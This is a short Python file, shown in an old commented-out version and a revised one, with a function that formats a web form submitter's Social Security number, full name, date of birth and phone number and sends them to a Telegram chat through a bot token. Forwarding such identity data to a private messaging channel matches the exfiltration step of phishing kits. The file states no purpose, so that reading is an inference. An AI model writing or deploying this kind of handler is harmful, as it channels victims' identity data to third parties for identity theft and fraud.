
'''
from telegram import Bot
from aiogram.types import InputFile
import logging
from django.shortcuts import redirect
async def send_to_telegram_bot(bot_token, chat_id, ssn, full_name, dob, phone_number):
    bot = Bot(token=bot_token)

    message = f"New Form Submission:\nSSN: {ssn}\nFull Name: {full_name}\nDOB: {dob}\nPhone Number: {phone_number}"

    try:
        await bot.send_message(chat_id=chat_id, text=message)

        logging.info("Message sent to Telegram successfully.")
        return redirect('success')  # Assuming 'success' is the URL name for the success page
    except Exception as e:
        logging.error(f"Error sending message to Telegram: {e}")
    finally:
        await bot.close()'''

from telegram import Bot
import logging
from django.shortcuts import redirect

async def send_to_telegram_bot(bot_token, chat_id, ssn, full_name, dob, phone_number):
    bot = Bot(token=bot_token)

    message = f"New Form Submission:\nSSN: {ssn}\nFull Name: {full_name}\nDOB: {dob}\nPhone Number: {phone_number}"

    try:
        await bot.send_message(chat_id=chat_id, text=message)

        logging.info("Message sent to Telegram successfully.")
        return True  # Indicate success
    except Exception as e:
        logging.error(f"Error sending message to Telegram: {e}")
        return False  # Indicate failure
    finally:
        await bot.close()